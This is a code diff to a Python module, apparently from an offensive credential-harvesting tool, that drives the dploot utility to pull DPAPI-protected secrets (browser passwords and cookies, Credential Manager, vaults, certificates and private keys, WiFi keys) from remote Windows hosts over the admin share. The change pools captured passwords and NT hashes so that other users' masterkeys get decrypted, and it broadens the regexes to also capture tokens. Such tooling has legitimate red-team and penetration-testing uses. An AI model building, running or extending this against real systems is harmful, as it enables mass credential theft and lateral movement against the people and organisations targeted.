@@ -1,13 +1,13 @@
 """DPAPI-protected loot via the dploot CLI (v4): browser passwords/cookies,
-Credential Manager, Vaults, certificates, RDCMan (.rdg), WiFi, WAM token broker,
-MobaXterm, plus the MACHINE DPAPI stores (need admin on the target).
-
-dploot v4 wants the target with -t and uses --quiet; auth is -u/-p/--hashes/-k.
-Per-credential: dploot decrypts a user's blobs with that user's password/hash.
-Parsing is tolerant (raw output always saved, so nothing is lost on a miss)."""
+Credential Manager, Vaults, certificates, RDCMan (.rdg), WiFi, WAM, MobaXterm,
+plus MACHINE DPAPI stores. dploot reads blobs over the C$ admin share, so we
+authenticate as an admin cred and feed the WHOLE pool via --passwords/--nthashes
+so other users' masterkeys (e.g. melissa in marcus' Chrome) get decrypted too."""
 from __future__ import annotations
 
+import os
 import re
+import tempfile
 from typing import List
 
 from core.credential import Credential
@@ -16,10 +16,11 @@ from core.tools import find_tool, run, strip_ansi
 from .base import BaseCollector
 
 KV_RE = re.compile(
-    r"^\s*(url|origin|target|targetname|resource|server|servername|service|ssid|"
-    r"username|user|login|password|pass|secret|key|cookie)\s*(?:[:=]|-)\s*(.+?)\s*$",
+    r"^\s*(url|host|origin|target|targetname|resource|server|servername|service|"
+    r"ssid|username|user|login|password|pass|secret|key|token)\b[^:=]*[:=]\s*(.+?)\s*$",
     re.I)
-INLINE_RE = re.compile(r"^(?P<url>\S+)\s+-\s+(?P<user>[^:\s]+):(?P<pw>.+)$")
+INLINE_RE = re.compile(
+    r"^(?:\[[^\]]+\]\s+)?(?P<url>\S+)\s+-\s+(?P<user>[^:\s]+):(?P<pw>.+)$")
 
 
 def _flush(host, source, buf) -> List[Secret]:
@@ -42,15 +43,40 @@ class _DplootModule(BaseCollector):
     module = ""
     source = ""
     module_extra: List[str] = []
+    user_level = True          # machine modules set this False
+
+    def _pool_files(self) -> List[str]:
+        self._tmp = []
+        args: List[str] = []
+        pws = [f"{c.username}:{c.password}" for c in self.creds if c.password is not None]
+        nts = [f"{c.username}:{c.nthash}" for c in self.creds if c.nthash]
+        for flag, lines in (("--passwords", pws), ("--nthashes", nts)):
+            if not lines:
+                continue
+            fd, path = tempfile.mkstemp(prefix="credhunter_", suffix=".txt")
+            with os.fdopen(fd, "w") as fh:
+                fh.write("\n".join(lines) + "\n")
+            self._tmp.append(path)
+            args += [flag, path]
+        return args
 
     def collect_with_cred(self, cred: Credential) -> List[Secret]:
         bin_ = find_tool("dploot")
         if not bin_:
             return []
-        cmd = ([bin_, self.module, "-t", self.host, "--quiet"]
-               + cred.dploot_auth_args() + self.module_extra)
-        res = run(cmd, timeout=self.timeout, raw_dir=self.raw_dir,
-                  raw_name=self._raw_name(cred))
+        cmd = [bin_, self.module, "-t", self.host] + cred.dploot_auth_args() + self.module_extra
+        self._tmp = []
+        if self.user_level:
+            cmd += self._pool_files()
+        try:
+            res = run(cmd, timeout=self.timeout, raw_dir=self.raw_dir,
+                      raw_name=self._raw_name(cred))
+        finally:
+            for p in getattr(self, "_tmp", []):
+                try:
+                    os.unlink(p)
+                except OSError:
+                    pass
         return self._parse(res.output)
 
     def _parse(self, out: str) -> List[Secret]:
@@ -147,14 +173,17 @@ class CertificatesCollector(_DplootModule):
 
 class MachineCredsCollector(_DplootModule):
     name = "MachineCred"; source = "MachineCred"; module = "machinecredentials"
+    user_level = False
     description = "Machine Credential Manager (needs admin)"
 
 
 class MachineVaultsCollector(_DplootModule):
     name = "MachineVault"; source = "MachineVault"; module = "machinevaults"
+    user_level = False
     description = "Machine Vaults (needs admin)"
 
 
 class MachineCertsCollector(CertificatesCollector):
     name = "MachineCert"; source = "MachineCert"; module = "machinecertificates"
+    user_level = False
     description = "Machine certificates + private keys (needs admin)"
